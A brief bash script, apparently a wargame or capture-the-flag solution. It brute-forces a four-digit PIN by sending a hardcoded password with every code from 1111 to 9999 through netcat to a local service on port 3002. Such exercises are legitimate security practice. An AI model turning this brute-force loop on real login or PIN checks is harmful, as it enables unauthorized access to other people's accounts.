#!/bin/bash


  bpass=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ


  for i in {1111..9999}; do
      echo  "$bpass $i"
done  | nc localhost 3002
